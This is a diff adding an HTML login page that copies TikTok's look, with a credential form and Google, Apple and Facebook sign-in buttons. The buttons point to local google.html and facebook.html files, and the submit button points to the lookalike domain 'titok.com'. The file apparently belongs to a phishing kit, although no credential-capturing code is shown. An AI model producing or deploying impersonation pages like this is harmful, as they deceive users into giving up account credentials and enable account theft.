@@ -1,0 +1,97 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>TikTok - Log in</title>
+  <link rel="icon" href="tik_img/favicon.ico">
+  <style>
+    /* Reset */
+    *{box-sizing:border-box;margin:0;padding:0px}
+    html,body{height:100%}
+    body{font-family:Inter, Arial, Helvetica, sans-serif;background:#fff;color:#111}
+
+    /* Layout */
+    .page{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;background:linear-gradient(180deg,#f8f8f8 0%,#ffffff 100%)}
+    .card{width:100%;max-width:980px;background:transparent;display:flex;gap:32px;align-items:center}
+
+    /* Left hero (promo) */
+    .hero{flex:1;display:flex;flex-direction:column;justify-content:center;padding:40px}
+    .logo{display:flex;align-items:center;justify-content:center;margin-bottom:32px;width:100%}
+    .logo img{height:80px}
+    .headline{font-size:clamp(28px,4vw,44px);line-height:1.05;font-weight:700;color:#111;margin-bottom:12px}
+    .sub{font-size:18px;color:#555}
+
+    /* Right panel (form) */
+    .panel{width:480px;background:#fff;border-radius:16px;padding:24px;box-shadow:0 8px 24px rgba(2,6,23,0.08);}
+    .panel .title{font-size:20px;font-weight:700;margin-bottom:18px;text-align:center}
+
+    .socials{display:flex;flex-direction:column;gap:12px;margin-bottom:12px;width:100%}
+    .social-btn{display:flex;align-items:center;gap:12px;padding:12px 24px;border-radius:10px;border:1px solid #e6e6e6;background:#fff;cursor:pointer;font-weight:600;width:100%;justify-content:center}
+    .social-btn img{height:20px}
+
+    .or{display:flex;align-items:center;gap:12px;margin:14px 0;color:#888;font-size:14px}
+    .or::before,.or::after{content:"";flex:1;height:1px;background:#eee}
+
+    form{display:flex;flex-direction:column;gap:12px;width:100%}
+    .input{padding:12px 14px;border-radius:10px;border:1px solid #e6e6e6;font-size:15px;width:100%}
+    .action{margin-top:6px;background:#fe2c55;color:#fff;border:none;padding:12px;border-radius:10px;font-weight:700;cursor:pointer;width:100%}
+
+    .footer{text-align:center;margin-top:12px;font-size:13px;color:#666}
+
+    /* Small screens */
+    @media (max-width:880px){
+      .card{flex-direction:column;align-items:center}
+      .panel{width:100%;max-width:420px}
+      .hero{padding:20px;text-align:center}
+      .headline{font-size:28px}
+    }
+
+    @media (max-width:420px){
+      .panel{border-radius:0;padding:18px}
+    }
+  </style>
+</head>
+<body>
+  <div class="page">
+    <div class="card">
+      <div class="hero" aria-hidden>
+        <div class="logo">
+          <img src="tiktok.png" alt="TikTok logo">
+        </div>
+        <h1 class="headline">Watch and create amazing videos</h1>
+        <p class="sub">Join TikTok to discover and create short videos. It's fun and easy to get started.</p>
+      </div>
+
+      <div class="panel" role="region" aria-label="Log in panel">
+        <div class="title">Log in to TikTok</div>
+
+        <div class="socials">
+        <a href="google.html">
+          <button class="social-btn" aria-label="Continue with Google">
+            <img src="https://www.svgrepo.com/show/355037/google.svg" alt="Google"> Continue with Google
+          </button></a>
+          <a href="#">
+          <button class="social-btn" aria-label="Continue with Apple">
+            <img src="apple.jpg" alt="Apple"> Continue with Apple
+          </button></a>
+          <a href="facebook.html">
+          <button class="social-btn" aria-label="Continue with Facebook">
+            <img src="facebook.webp" alt="Facebook"> Continue with Facebook
+          </button></a>
+        </div>
+
+        <div class="or">or</div>
+
+        <form>
+          <input class="input" type="text" placeholder="Phone, email or username" required>
+          <input class="input" type="password" placeholder="Password" required>
+          <a href="https://www.titok.com"><button class="action" type="submit">Log in</button>
+        </form>
+
+        <div class="footer">Don't have an account? <a href="#" style="color:#fe2c55;font-weight:700;text-decoration:none">Sign up</a></div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
